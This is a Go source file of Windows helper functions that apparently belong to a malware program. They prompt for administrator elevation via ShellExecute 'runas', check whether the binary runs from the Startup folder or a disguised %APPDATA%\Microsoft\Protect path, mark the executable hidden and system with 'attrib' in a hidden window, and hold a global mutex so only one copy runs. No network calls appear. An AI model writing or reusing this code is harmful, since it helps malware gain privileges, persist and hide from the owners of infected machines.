package program

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func IsElevated() bool {
	ret, _, _ := syscall.NewLazyDLL("shell32.dll").NewProc("IsUserAnAdmin").Call()
	return ret != 0
}

func RequestElevation() error {
	if IsElevated() {
		return nil
	}

	exe, err := os.Executable()
	if err != nil {
		return err
	}

	// Use ShellExecute to request elevation
	verb := "runas"
	shellExecute := syscall.NewLazyDLL("shell32.dll").NewProc("ShellExecuteW")
	
	ret, _, _ := shellExecute.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(verb))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(exe))),
		0,
		0,
		1, // SW_SHOWNORMAL
	)
	
	if ret <= 32 {
		return fmt.Errorf("failed to request elevation")
	}
	
	// Exit current process as elevated version will start
	os.Exit(0)
	return nil
}

func IsInStartupPath() bool {
	exePath, err := os.Executable()
	if err != nil {
		return false
	}
	exePath = filepath.Dir(exePath)

	if exePath == "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" {
		return true
	}

	if exePath == filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Protect") {
		return true
	}

	return false
}

func HideSelf() {
	exe, err := os.Executable()
	if err != nil {
		return
	}

	cmd := exec.Command("attrib", "+h", "+s", exe)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	cmd.Run()
}

func IsAlreadyRunning() bool {
	const AppID = "3575651c-bb47-448e-a514-22865732bbc"

	_, err := windows.CreateMutex(nil, false, syscall.StringToUTF16Ptr(fmt.Sprintf("Global\\%s", AppID)))
	return err != nil
}